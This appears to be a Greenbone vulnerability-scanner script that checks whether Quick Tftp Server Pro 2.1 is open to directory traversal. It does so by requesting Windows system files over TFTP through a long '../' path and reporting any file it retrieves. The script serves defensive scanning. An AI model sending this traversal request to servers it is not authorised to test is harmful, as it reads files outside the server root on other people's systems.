if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100899" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-11-09 13:58:26 +0100 (Tue, 09 Nov 2010)" );
	script_bugtraq_id( 44712 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "Quick Tftp Server Pro Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/44712" );
	script_category( ACT_ATTACK );
	script_family( "Remote file access" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc", "tftpd_backdoor.sc", "os_detection.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_require_keys( "Host/runs_windows" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "summary", value: "Quick Tftp Server Pro is prone to a directory-traversal vulnerability
  because it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue can allow an attacker to retrieve arbitrary
  files outside of the FTP server root directory. This may aid in further attacks." );
	script_tag( name: "affected", value: "Quick Tftp Server Pro 2.1 is vulnerable. Other versions may also
  be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("tftp.inc.sc");
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
if(!tftp_has_reliable_get( port: port )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	res = tftp_get( port: port, path: "../../../../../../../../../../../../" + files[file] );
	if(!res){
		continue;
	}
	if(egrep( pattern: file, string: res, icase: TRUE )){
		report = NASLString( "The " + files[file] + " file contains:\\n", res );
		security_message( port: port, data: report, proto: "udp" );
		exit( 0 );
	}
}
exit( 99 );

